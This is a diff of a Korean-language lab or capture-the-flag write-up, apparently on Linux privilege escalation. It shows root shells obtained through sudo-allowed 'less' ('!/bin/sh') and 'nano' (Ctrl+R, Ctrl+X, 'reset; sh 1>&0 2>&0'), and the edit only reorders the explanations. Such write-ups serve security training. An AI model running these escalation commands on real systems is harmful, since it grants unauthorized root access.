@@ -59,12 +59,11 @@ cat /home/ubuntu/flag2.txt
 ---
 
 #### 3.2 less 명령어 이용
-
+- less 명령어로 파일을 열고 `!/bin/sh`를 실행하면 쉘이 생성되었다.
 ```bash
 sudo less /etc/profile
 !/bin/sh
 ```
-- less 명령어로 파일을 열고 `!/bin/sh`를 실행하면 쉘이 생성되었다.
 
 ![파일 내용](./screenshots/file_content.png)
 
@@ -75,14 +74,14 @@ sudo less /etc/profile
 ---
 
 #### 3.3 nano 명령어 이용
+- `nano` 실행 후 Ctrl+R, Ctrl+X 키를 눌러 명령 실행 모드 진입을 했다.
+- `reset; sh 1>&0 2>&0` 입력하여 루트 쉘을 획득하였다.
+
 ```bash
 sudo nano
 ^R^X
 reset; sh 1>&0 2>&0
 ```
-- `nano` 실행 후 Ctrl+R, Ctrl+X 키를 눌러 명령 실행 모드 진입을 했다.
-- `reset; sh 1>&0 2>&0` 입력하여 루트 쉘을 획득하였다.
-
 ![nano를 이용한 루트 쉘 획득](./screenshots/nano_root.png)
 
 - 루트 권한이 부여되었음을 확인하였다.
